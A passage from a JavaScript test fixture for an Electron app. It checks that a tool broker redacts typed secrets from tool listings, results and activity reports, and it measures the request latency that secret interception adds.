      /** @type {unknown[]} */
      const reported = [];
      /** @type {string[]} */
      const digests = [];
      const broker = createWebMcpBroker({
        redact: (/** @type {unknown} */ value) => secrets.redact(value),
        getTab: () => tab,
        getActiveTabId: () => tab.tabId,
        onToolsChanged: (/** @type {string} */ _tabId, /** @type {unknown} */ tools) => reported.push(tools),
        onActivity: (/** @type {unknown} */ activity) => reported.push(activity),
        readFrameTools: async () => [{ name: "echo", title: `Echo ${PASSWORD}`, description: `Returns ${placeholder}`, origin: ALLOWED }],
        executeFrameTool: async (/** @type {unknown} */ _frame, /** @type {{ expectedDigest: string }} */ call) => {
          digests.push(call.expectedDigest);
          return JSON.stringify({ echoed: PASSWORD, encoded: Buffer.from(PASSWORD).toString("base64"), typed: placeholder });
        },
      });
      const listed = await broker.listTools({ sessionId: SESSION });
      expect(listed.ok && listed.tools.length === 1, "the tool is listed");
      expect(clean(listed), "a listed tool carries no secret or placeholder");
      const outcome = await broker.executeTool({ toolId: listed.tools[0].toolId, input: {}, sessionId: SESSION });
      expect(outcome.ok, "a redacted listing still runs its tool");
      expect(digests.length === 1 && digests[0].includes(placeholder), "the tool is checked against the page's own descriptor");
      expect(clean(outcome), "a tool result carries no secret or placeholder");
      await broker.refreshTabToolCount(tab.tabId);
      expect(reported.length === 3 && clean(reported), "what the broker reports to the app carries no secret or placeholder");
      secrets.tabClosed("site-tools");
    } },
    { name: "latency of pausing every request", async run() {
      const tab = await openTab(`${ALLOWED}/`);
      await page(tab, "timeFetches(50)");
      const off = await page(tab, "timeFetches(200)");
      await typeSecret(tab, password, "latency");
      const on = await page(tab, "timeFetches(200)");
      await interception.release(tab);
      const after = await page(tab, "timeFetches(200)");
      tab.window.destroy();
      return { offMeanMs: off.mean, onMeanMs: on.mean, afterMeanMs: after.mean, offMedianMs: off.median, onMedianMs: on.median, afterMedianMs: after.median, offP95Ms: off.p95, onP95Ms: on.p95 };
    } },
  ];

  /** @type {{ name: string, ok: boolean, error?: string, facts?: Record<string, number> }[]} */
  const results = [];
  for (const { name, run: runCase } of cases) {
    phase = name;
    try {
      const facts = await runCase();
      results.push({ name, ok: true, ...(facts ? { facts } : {}) });
    } catch (error) {
      results.push({ name, ok: false, error: error instanceof CheckFailed ? error.message : whereFrom(error) });
    }
  }
  console.log(JSON.stringify({ ok: results.every((result) => result.ok), electron: process.versions.electron, chrome: process.versions.chrome, results }));
  clearTimeout(timeout);
  await interception.dispose();
  for (const window of BrowserWindow.getAllWindows()) window.destroy();
  for (const { server } of [allowed, attacker]) { server.closeAllConnections(); server.close(); }
  app.exit(0);
}

// Do not hold Electron's module evaluation open while awaiting app readiness.
run().catch(() => { console.error("Secret swap fixture failed to run"); app.exit(1); });
